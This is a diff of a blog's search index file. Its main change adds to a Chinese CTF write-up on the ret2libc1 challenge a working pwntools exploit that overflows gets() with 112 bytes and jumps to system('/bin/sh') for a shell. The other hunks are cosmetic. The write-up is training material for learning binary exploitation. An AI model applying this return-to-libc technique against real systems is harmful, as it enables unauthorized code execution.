@@ -8,7 +8,7 @@
     <link href="/2021/03/10/ret2libc1/"/>
     <url>/2021/03/10/ret2libc1/</url>
     
-    <content type="html"><![CDATA[<p>知识点：基本ROP/cyclic计算地址偏移/ROPgadget/有’/bin/sh’与call _system情况下的系统调用</p><p>先checksec</p><p><img src="/1.png" alt="1"></p><p>是32位程序，开启了栈堆不可执行保护，打开ida</p><p><img src="/2.png" alt="2"></p><p>gets函数存在栈溢出，用cyclic计算偏移地址。</p><p>首先生成一个比较大的cyclic值。</p><p><img src="/3.png" alt="3"></p><p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/4.png" alt="4"></p><p>这里的小箭头指向的就是要跳转的指令的地址，因为填充的数据不可跳转，就停在了这里，这里的0x62616164就是我们填充进去的cyclic中的某一小段，我们找到这一小段在cyclic中的地址，就可以算出需要填充多少垃圾数据，即劫持返回地址的偏移量。</p><p><img src="/5.png" alt="5"></p><p>因此我们需要填充112个垃圾数据。</p><p>接下来寻找反汇编程序中是否含有/bin/sh与system函数</p><p><img src="/6.png" alt="6"></p><p><img src="/7.png" alt="7"></p><p>那么有了system和/bin/sh就可以写exp了</p>]]></content>
+    <content type="html"><![CDATA[<p>知识点：基本ROP/cyclic计算地址偏移/ROPgadget/有’/bin/sh’与call _system情况下的系统调用</p><p>先checksec</p><p><img src="/1.png" alt="1"></p><p>是32位程序，开启了栈堆不可执行保护，打开ida</p><p><img src="/2.png" alt="2"></p><p>gets函数存在栈溢出，用cyclic计算偏移地址。</p><p>首先生成一个比较大的cyclic值。</p><p><img src="/3.png" alt="3"></p><p>复制到ret2libc1的gdb里，实现栈溢出。<img src="/4.png" alt="4"></p><p>这里的小箭头指向的就是要跳转的指令的地址，因为填充的数据不可跳转，就停在了这里，这里的0x62616164就是我们填充进去的cyclic中的某一小段，我们找到这一小段在cyclic中的地址，就可以算出需要填充多少垃圾数据，即劫持返回地址的偏移量。</p><p><img src="/5.png" alt="5"></p><p>因此我们需要填充112个垃圾数据。</p><p>接下来寻找反汇编程序中是否含有/bin/sh与system函数</p><p><img src="/6.png" alt="6"></p><p><img src="/7.png" alt="7"></p><p>那么有了system和/bin/sh就可以写exp了，这一题跟系统调用不一样，本题是直接使用call system函数，/bin/sh应该放在栈中作为函数参数，但是系统调用需要把参数放入寄存器中，以int 80h作为函数参数。</p><p>exp</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">p</span> = process(&#x27;./ret<span class="hljs-number">2</span>libc<span class="hljs-number">1</span>&#x27;)<br><span class="hljs-attribute">context</span>.log_level = &#x27;debug&#x27;<br><span class="hljs-attribute">gdb</span>.attach(p)<br><span class="hljs-attribute">binsh</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048720</span><br><span class="hljs-attribute">system</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048460</span><br><br><span class="hljs-attribute">p</span>.recvuntil(&#x27;RET<span class="hljs-number">2</span>LIBC &gt;_&lt;\n&#x27;)<br><span class="hljs-attribute">payload</span> = &#x27;a&#x27; * <span class="hljs-number">112</span> + p<span class="hljs-number">32</span>(system) + &#x27;b&#x27;*<span class="hljs-number">4</span> + p<span class="hljs-number">32</span>(binsh)<br><span class="hljs-attribute">p</span>.send(payload)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></div></td></tr></table></figure>]]></content>
     
     
     <categories>
@@ -166,7 +166,7 @@
     <link href="/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
     <url>/2021/01/01/+Mg%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
     
-    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#x31;&#x37;&#x35;&#x36;&#x35;&#54;&#x37;&#56;&#x31;&#52;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#x6d;">&#x31;&#x37;&#x35;&#x36;&#x35;&#54;&#x37;&#56;&#x31;&#52;&#x40;&#x71;&#113;&#46;&#x63;&#111;&#x6d;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="一点感想"><a href="#一点感想" class="headerlink" title="一点感想"></a>一点感想</h2><h3 id="01"><a href="#01" class="headerlink" title="01"></a>01</h3><p>学习过程中的琐碎知识点与方法，时时值得记录，记录下自己的学习轨迹，以求温故知新，不记下来的话，回望来时的路似乎有点空荡</p><h3 id="02"><a href="#02" class="headerlink" title="02"></a>02</h3><p>可能要学很多很多不同领域的知识，大概方便自己区分一下（？）</p><h3 id="03"><a href="#03" class="headerlink" title="03"></a>03</h3><p>会把学到的大大小小的知识点、解决的大大小小的问题、做过的大大小小的题都记下来，大概是个日记本</p><h3 id="04"><a href="#04" class="headerlink" title="04"></a>04</h3><p>blog模板有一些功能还不太会用，接下来会慢慢学习<br>该blog采用模板：fluid搭建，后续会加一些实用（花里胡哨）的功能，比如评论区和音乐播放器和友链（如果有hxd愿意的话）</p><h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>用国内网络访问会有亿点点慢，后期可能会换成私人服务器，如果有奇怪的bug存在，pls联系<a href="mailto:&#49;&#55;&#x35;&#x36;&#53;&#54;&#x37;&#x38;&#x31;&#52;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#49;&#55;&#x35;&#x36;&#53;&#54;&#x37;&#x38;&#x31;&#52;&#x40;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a></p><h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>关于页有我的github，可能后面会慢慢开始用，但现在是一片荒地（</p><h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>还没有决定方向，大概突然想学什么就学什么</p><h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>大概是要告诫自己：万丈高楼平地起，勿在浮沙筑高台</p>]]></content>
     
     
     <categories>
@@ -184,22 +184,22 @@
   
   
   <entry>
-    <title>about</title>
+    <title>categories</title>
     <link href="/"/>
     <url>/</url>
     
-    <content type="html"><![CDATA[<p>每一个伟大的成就都有一个微不足道的开始</p><p>$《程序员的自我修养》《c++ primer plus》阅读进行中…</p><p>$《汇编语言–王爽》阅读已完成…</p><p>$《c primer plus》阅读已完成…</p>]]></content>
+    <content type="html"><![CDATA[]]></content>
     
   </entry>
   
   
   
   <entry>
-    <title>categories</title>
+    <title>about</title>
     <link href="/"/>
     <url>/</url>
     
-    <content type="html"><![CDATA[]]></content>
+    <content type="html"><![CDATA[<p>每一个伟大的成就都有一个微不足道的开始</p><p>$《程序员的自我修养》《c++ primer plus》阅读进行中…</p><p>$《汇编语言–王爽》阅读已完成…</p><p>$《c primer plus》阅读已完成…</p>]]></content>
     
   </entry>
   
